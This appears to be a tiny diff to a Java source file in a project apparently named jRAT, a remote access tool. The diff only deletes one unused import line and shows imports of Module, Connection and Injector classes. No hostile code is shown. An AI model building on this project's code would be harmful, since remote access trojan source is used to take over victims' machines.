@@ -1,6 +1,5 @@
 package jrat.client.modules;
 
-import com.sun.xml.internal.bind.v2.model.annotation.Quick;
 import jrat.api.Module;
 import jrat.client.Connection;
 import jrat.client.Injector;
